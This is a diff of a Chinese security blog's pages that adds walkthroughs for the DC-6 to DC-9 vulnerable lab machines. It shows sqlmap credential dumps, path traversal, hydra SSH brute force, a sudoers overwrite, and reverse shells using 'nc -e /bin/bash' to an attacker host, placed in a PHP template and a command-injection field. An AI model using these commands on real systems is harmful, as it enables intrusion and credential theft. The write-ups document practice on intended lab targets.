@@ -57,6 +57,8 @@
 	        
 				<li><a href="/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/">随笔</a></li>
 	        
+				<li><a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">靶机攻略</a></li>
+	        
 			</ul>
 		</nav>
 		<nav class="header-smart-menu">
@@ -113,6 +115,8 @@
 			
 				
 			
+				
+			
 			
 			
 			<nav class="header-nav">
@@ -130,12 +134,14 @@
 			</nav>
 
 			<nav class="header-menu js-header-menu">
-				<ul style="width: 50%">
+				<ul style="width: 70%">
 				
 				
-					<li style="width: 50%"><a href="/">主页</a></li>
+					<li style="width: 33.333333333333336%"><a href="/">主页</a></li>
 		        
-					<li style="width: 50%"><a href="/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/">随笔</a></li>
+					<li style="width: 33.333333333333336%"><a href="/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/">随笔</a></li>
+		        
+					<li style="width: 33.333333333333336%"><a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">靶机攻略</a></li>
 		        
 				</ul>
 			</nav>
@@ -173,12 +179,52 @@
     <div class="article-entry" itemprop="articleBody">
       
         <ul>
-<li><a href="#%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86">情报收集</a></li>
-<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li>
+<li><a href="#%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86">情报收集</a><ul>
+<li><a href="#%E8%8E%B7%E5%8F%96%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1">获取主机端口服务</a></li>
+<li><a href="#%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">网站信息收集</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a><ul>
+<li><a href="#sql%E6%B3%A8%E5%85%A5">sql注入</a></li>
+<li><a href="#%E5%B8%90%E5%8F%B7%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96">帐号密码提取</a></li>
+<li><a href="#sql%E6%B3%A8%E5%85%A5%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93">sql注入，另一个数据库</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a></li>
+<li><a href="#%E9%98%B2%E7%81%AB%E5%A2%99%E6%89%93%E5%BC%80ssh">防火墙打开ssh</a></li>
+<li><a href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F">横向渗透</a></li>
+</ul>
+</li>
 <li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
 <li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
 </ul>
-<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
+<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><h3 id="获取主机端口服务"><a href="#获取主机端口服务" class="headerlink" title="获取主机端口服务"></a>获取主机端口服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.193.0/24</span><br><span class="line">nmap -A -T4 -p- 192.168.193.133</span><br></pre></td></tr></table></figure>
+<p>发现存在http服务，参考其它博客，正常应该显示22&#x2F;tcp filtered ssh，但是没有显示这里不知道为什么。<br><img src="/img/DC-9/image.png" alt="alt text"></p>
+<h3 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h3><p>发现疑似sql注入界面。<br><img src="/img/DC-9/image-1.png" alt="alt text"><br>brup抓包知道这里是POST请求，使用sqlmap试试。<br><img src="/img/DC-9/image-2.png" alt="alt text"></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.193.133//results.php&quot; --data=&quot;search=1&quot; --dbs --batch</span><br><span class="line">sqlmap -u &quot;http://192.168.193.133//results.php&quot; --data=&quot;search=1&quot; -D users --tables --batch </span><br><span class="line">sqlmap -u &quot;http://192.168.193.133//results.php&quot; --data=&quot;search=1&quot; -D users -T UserDetails --columns --batch</span><br><span class="line">sqlmap -u &quot;http://192.168.193.133//results.php&quot; --data=&quot;search=1&quot; -D users -T UserDetails --columns username,password --dump --batch</span><br></pre></td></tr></table></figure>
+<h3 id="帐号密码提取"><a href="#帐号密码提取" class="headerlink" title="帐号密码提取"></a>帐号密码提取</h3><p><img src="/img/DC-9/image-3.png" alt="alt text"><br>可以使用linux命令行提取帐号密码行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;print $6&#125;&#x27; record.txt</span><br><span class="line">awk &#x27;&#123;print $11&#125;&#x27; record.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-9/image-4.png" alt="alt text"><br>获取一系列帐号密码，之后肯定有用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># users</span><br><span class="line">marym</span><br><span class="line">julied</span><br><span class="line">fredf</span><br><span class="line">barneyr</span><br><span class="line">tomc</span><br><span class="line">jerrym</span><br><span class="line">wilmaf</span><br><span class="line">bettyr</span><br><span class="line">chandlerb</span><br><span class="line">joeyt</span><br><span class="line">rachelg</span><br><span class="line">rossg</span><br><span class="line">monicag</span><br><span class="line">phoebeb</span><br><span class="line">scoots</span><br><span class="line">janitor</span><br><span class="line">janitor2</span><br><span class="line"></span><br><span class="line"># passwards</span><br><span class="line">3kfs86sfd</span><br><span class="line">468sfdfsd2</span><br><span class="line">4sfd87sfd1</span><br><span class="line">RocksOff</span><br><span class="line">TC&amp;TheBoyz</span><br><span class="line">B8m#48sd</span><br><span class="line">Pebbles</span><br><span class="line">BamBam01</span><br><span class="line">UrAG0D!</span><br><span class="line">Passw0rd</span><br><span class="line">yN72#dsd</span><br><span class="line">ILoveRachel</span><br><span class="line">3248dsds7s</span><br><span class="line">smellycats</span><br><span class="line">YR3BVxxxw87</span><br><span class="line">Ilovepeepee</span><br><span class="line">Hawaii-Five-0</span><br></pre></td></tr></table></figure>
+<p>打开brup使用pitchfork模式尝试爆破网站密码失败，看来数据库存储的不是网站登录密码。</p>
+<h3 id="sql注入，另一个数据库"><a href="#sql注入，另一个数据库" class="headerlink" title="sql注入，另一个数据库"></a>sql注入，另一个数据库</h3><p><img src="/img/DC-9/image-5.png" alt="alt text"><br>之前注入的是users，这里还有一个Staff，进行注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.193.133//results.php&quot; --data=&quot;search=1&quot; --dbs --batch</span><br><span class="line">sqlmap -u &quot;http://192.168.193.133//results.php&quot; --data=&quot;search=1&quot; -D Staff --tables --batch </span><br><span class="line">sqlmap -u &quot;http://192.168.193.133//results.php&quot; --data=&quot;search=1&quot; -D Staff -T Users --columns --batch</span><br><span class="line">sqlmap -u &quot;http://192.168.193.133//results.php&quot; --data=&quot;search=1&quot; -D Staff -T Users --columns Username,password --dump --batch</span><br><span class="line"></span><br><span class="line">admin 856f5de590ef37314e7c3bdf6f8a66dc</span><br><span class="line"># md5解密后值</span><br><span class="line">transorbital1</span><br></pre></td></tr></table></figure>
+<p>使用md5<a target="_blank" rel="noopener" href="http://md5.qqtv5.com/">解密网站</a></p>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>根据File does not exist值猜测存在文件包含漏洞。<br><img src="/img/DC-9/image-6.png" alt="alt text"><br>使用brup爆破。<br><img src="/img/DC-9/image-7.png" alt="alt text"><br>先爆破参数，为file，由于之前ssh没有打开，可以尝试获取防火墙策略。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /manage.php?file=../../../../etc/knockd.conf HTTP/1.1</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-9/image-8.png" alt="alt text"></p>
+<h3 id="防火墙打开ssh"><a href="#防火墙打开ssh" class="headerlink" title="防火墙打开ssh"></a>防火墙打开ssh</h3><p>可以知道防火墙敲门策略，开启ssh，暴力破解。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 防火墙开启ssh策略</span><br><span class="line">knock 192.168.193.133 7469 8475 9842</span><br><span class="line"></span><br><span class="line"># ssh暴力破解</span><br><span class="line">hydra -L DC-9-U.txt -P DC-9-P.txt ssh://192.168.193.133 -t 64 -o result.txt</span><br><span class="line"></span><br><span class="line"># ssh account</span><br><span class="line">chandlerb UrAG0D!</span><br><span class="line">joeyt Passw0rd</span><br><span class="line">janitor Ilovepeepee</span><br></pre></td></tr></table></figure>
+<h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><p><img src="/img/DC-9/image-9.png" alt="alt text"><br>在janitor工作目录下发现密码本，丰富密码本后，再次进行ssh爆破。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hydra -L DC-9-U.txt -P DC-9-P.txt ssh://192.168.193.133 -t 64 -o result.txt</span><br><span class="line"></span><br><span class="line"># 发现新用户</span><br><span class="line">fredf B4-Tru3-001</span><br></pre></td></tr></table></figure>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p><img src="/img/DC-9/image-10.png" alt="alt text"><br>发现新用户拥有向任意文件写入新内容命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 将chandlerb用户提权为root</span><br><span class="line">echo &quot;chandlerb ALL=(ALL) NOPASSWD: ALL&quot; &gt; /home/fredf/ch</span><br><span class="line">sudo ./test /home/fredf/ch /etc/sudoers</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>查询界面存在sql注入，获取登录密码。</li>
+<li>ssh拒绝连接，22端口未开放或者存在knockd服务。</li>
+<li>存在文件包含漏洞，获取knockd服务开启ssh方法。</li>
+<li>用户隐藏文件存在密码，横向渗透，获取新的ssh用户。</li>
+<li>存在后门文件，可以向任意文件写入新的内容。</li>
+</ol>
+
       
 
       
@@ -252,12 +298,42 @@
     <div class="article-entry" itemprop="articleBody">
       
         <ul>
-<li><a href="#%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86">情报收集</a></li>
+<li><a href="#%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86">情报收集</a><ul>
+<li><a href="#%E8%8E%B7%E5%8F%96%E4%B8%BB%E6%9C%BA%E6%9C%8D%E5%8A%A1">获取主机服务</a></li>
+<li><a href="#%E6%9F%A5%E6%89%BE%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2">查找登录界面</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81">获取登录密码</a></li>
+</ul>
+</li>
 <li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li>
-<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
+<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a><ul>
+<li><a href="#%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%91%BD%E4%BB%A4">寻找漏洞利用命令</a></li>
+<li><a href="#%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%91%BD%E4%BB%A4%E8%84%9A%E6%9C%AC%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A">上传漏洞命令脚本到服务器上</a></li>
+<li><a href="#%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%E6%8F%90%E6%9D%83">执行脚本提权</a></li>
+</ul>
+</li>
 <li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
 </ul>
-<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
+<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><h3 id="获取主机服务"><a href="#获取主机服务" class="headerlink" title="获取主机服务"></a>获取主机服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.193.0/24</span><br><span class="line">nmap -A -T4 -p- 192.168.193.131</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-8/image.png" alt="alt text"><br>提供ssh与http服务，Drupal 7 。</p>
+<h3 id="查找登录界面"><a href="#查找登录界面" class="headerlink" title="查找登录界面"></a>查找登录界面</h3><p>打开网站，没有找到明显的登录界面，使用dirsearch进一步信息搜索。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.193.131</span><br></pre></td></tr></table></figure>
+<h3 id="获取登录密码"><a href="#获取登录密码" class="headerlink" title="获取登录密码"></a>获取登录密码</h3><p>点击不同界面，发现?nid&#x3D;2参数一直在变化，猜测可以使用sql注入。<br><img src="/img/DC-8/image-1.png" alt="alt text"><br>修改?nid&#x3D;2为?nid&#x3D;2&#96;，显示如下界面，进一步验证存在sql注入。<br><img src="/img/DC-8/image-2.png" alt="alt text"><br>使用sqlmap获取登录密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.193.131/?nid=3&quot;</span><br><span class="line">sqlmap -u &quot;http://192.168.193.131/?nid=3&quot; --dbs</span><br><span class="line">sqlmap -u &quot;http://192.168.193.131/?nid=3&quot; -D d7db --tables</span><br><span class="line">sqlmap -u &quot;http://192.168.193.131/?nid=3&quot; -D d7db -T users --columns</span><br><span class="line">sqlmap -u &quot;http://192.168.193.131/?nid=3&quot; -D d7db -T users -C name,pass --dump </span><br><span class="line"></span><br><span class="line">admin $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span><br><span class="line">john  $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF</span><br></pre></td></tr></table></figure>
+<p>使用john破解加密值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">john --show DC-8-P.txt</span><br><span class="line"></span><br><span class="line">usr: john </span><br><span class="line">passwd: turtle</span><br></pre></td></tr></table></figure>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>登录后发现，contact us的回复，用户可以自定义，这里可以利用它修改为php code，建立反弹shell<br><img src="/img/DC-8/image-3.png" alt="alt text"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;test1&lt;/p&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">system(&quot;nc -e /bin/bash 192.168.193.128 10086&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="寻找漏洞利用命令"><a href="#寻找漏洞利用命令" class="headerlink" title="寻找漏洞利用命令"></a>寻找漏洞利用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f -exec ls -la &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">exim4 --version</span><br><span class="line">searchsploit exim</span><br><span class="line">searchsploit -p linux/local/46996.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-8/image-4.png" alt="alt text"><br>exim4版本为4.89,漏洞查到存在权限提升漏洞，Exim 4.87 &#x2F; 4.91 - Local Privilege Escalation (Metasploit) 。<br><img src="/img/DC-8/image-5.png" alt="alt text"></p>
+<h3 id="上传漏洞命令脚本到服务器上"><a href="#上传漏洞命令脚本到服务器上" class="headerlink" title="上传漏洞命令脚本到服务器上"></a>上传漏洞命令脚本到服务器上</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/46996.sh D8-A.sh</span><br><span class="line">nc 192.168.193.131 10085 &lt; D8-A.sh </span><br><span class="line">nc -lvvp 10085 &gt; a.sh</span><br></pre></td></tr></table></figure>
+<h3 id="执行脚本提权"><a href="#执行脚本提权" class="headerlink" title="执行脚本提权"></a>执行脚本提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./a.sh -m netcat</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-8/image-6.png" alt="alt text"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>网站参数存在sql注入获取密码</li>
+<li>用户可以自定义更改contact界面返回内容，没有对php代码执行进行检测。</li>
+<li>exim 4.89存在本地权限提升漏洞</li>
+</ol>
+
       
 
       
@@ -331,12 +407,31 @@
     <div class="article-entry" itemprop="articleBody">
       
         <ul>
-<li><a href="#%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86">情报收集</a></li>
+<li><a href="#%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86">情报收集</a><ul>
+<li><a href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">端口扫描</a></li>
+<li><a href="#%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96">网站信息获取</a></li>
+</ul>
+</li>
 <li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li>
-<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
+<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a><ul>
+<li><a href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">进一步信息收集</a></li>
+<li><a href="#%E6%B7%BB%E5%8A%A0%E7%BD%91%E7%AB%99%E7%94%A8%E6%88%B7">添加网站用户</a></li>
+</ul>
+</li>
 <li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
 </ul>
-<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
+<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>首先查看主机服务。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.193.0/24</span><br><span class="line">nmap -A -T4 -p- 192.168.193.130</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-7/image.png" alt="alt text"><br>可以看到主机提供http与ssh服务。</p>
+<h3 id="网站信息获取"><a href="#网站信息获取" class="headerlink" title="网站信息获取"></a>网站信息获取</h3><p>打开网站，进一步获取信息。<br><img src="/img/DC-7/image-1.png" alt="alt text"><br>界面左下角可以看到作者为DC7USER。<br>可以在github下查看源码，在config.php看到如下信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$servername = &quot;localhost&quot;;</span><br><span class="line">	$username = &quot;dc7user&quot;;</span><br><span class="line">	$password = &quot;MdR3xOgB7#dW&quot;;</span><br><span class="line">	$dbname = &quot;Staff&quot;;</span><br><span class="line">	$conn = mysqli_connect($servername, $username, $password, $dbname);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>使用获取的帐号密码尝试网站登录，ssh登录。ssh登录成功。这里体现收集信息的重要性，收集信息的来源越多越好。</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="进一步信息收集"><a href="#进一步信息收集" class="headerlink" title="进一步信息收集"></a>进一步信息收集</h3><p>在该用户目录下查看mbox文件，疑似存在定期执行的脚本。<br><img src="/img/DC-7/image-2.png" alt="alt text"><br>发现该脚本所有者为root，而www-data拥有写权限，这是我们要想办法切换到www-data用户。</p>
+<h3 id="添加网站用户"><a href="#添加网站用户" class="headerlink" title="添加网站用户"></a>添加网站用户</h3><p><img src="/img/DC-7/image-3.png" alt="alt text"><br>查看脚本发现drush命令，进一步查看该命令的功能。<br><img src="/img/DC-7/image-4.png" alt="alt text"><br>发现这个脚本可以对网站账户帐号密码进行修改。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 在/var/www/html路径下执行，修改密码</span><br><span class="line">drush user-password admin --password=&quot;admin&quot;</span><br></pre></td></tr></table></figure>
+<p>登录后这一块处于知识盲区，需要进一步调查，处于安全考虑，drupal8不再直接支持php语言，需要安装拓展。<br>可参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/rumil/article/details/138052132">博客</a><br>登录后，修改脚本内容即可提权建立反弹shell，静候15分钟即可提权成功。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次考验的是信息收集能力，源码的获取，drush命令的调研，网站php语言拓展方式的调研，虽然参照网上博客完成了，但是感觉最根本的能力，也就是信息收集能力，需要进一步提升。</p>
+
       
 
       
@@ -412,10 +507,39 @@
         <ul>
 <li><a href="#%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86">情报收集</a></li>
 <li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li>
-<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
+<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a><ul>
+<li><a href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F">横向渗透</a></li>
+<li><a href="#%E6%8F%90%E6%9D%83">提权</a></li>
+</ul>
+</li>
 <li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
 </ul>
-<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
+<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><p>获取主机服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.193.0/24</span><br><span class="line">nmap -A -T4 -p- 192.168.193.139</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-6/image.png" alt="alt text"><br>可以看到开放ssh服务与http服务。<br>打开网站没有看到登录界面，目录搜索试试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 登录界面查找</span><br><span class="line">dirsearch -u http://wordy/ </span><br><span class="line"></span><br><span class="line">#网站类型查找。</span><br><span class="line">whatweb http://wordy/</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-6/image-1.png" alt="alt text"><br>找到登录界面，发现网站类型为wordpress。情报收集告一段落。</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>先获取网站帐号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 获取帐号</span><br><span class="line">wpscan --url http://wordy --api-token QK4yHoAgn8S2v9r1jdeDYUO2c8XUFvwanM4AVco9nbk -e u</span><br><span class="line"></span><br><span class="line"># 获取密码本，获取kali自带密码本，过滤k01关键字</span><br><span class="line">zcat /usr/share/wordlists/rockyou.txt.gz | grep k01 &gt; ./DC-6-P.txt</span><br><span class="line"></span><br><span class="line"># 获取密码。</span><br><span class="line">wpscan --url http://wordy --api-token QK4yHoAgn8S2v9r1jdeDYUO2c8XUFvwanM4AVco9nbk -U DC-6-U.txt -P DC-6-P.txt</span><br><span class="line"></span><br><span class="line"># 成功找到一个用户密码</span><br><span class="line">mark helpdesk01</span><br></pre></td></tr></table></figure>
+<p>登录看看，发现存在可以执行命令的界面，执行命令试试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.1 | ls</span><br></pre></td></tr></table></figure>
+<p><img src="/img/DC-6/image-2.png" alt="alt text"><br>由此可知存在命令行注入漏洞，尝试反弹shell，由于限制了输入大小，可以使用brup或者在网页修改大小限制。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 修改post参数</span><br><span class="line">10.0.0.1 | nc -e /bin/bash 192.168.193.128 10086</span><br></pre></td></tr></table></figure>
+<p>至此建立反弹shell</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><p>在mark的每日任务清单里发现新的用户名和密码。<br><img src="/img/DC-6/image-3.png" alt="alt text"></p>
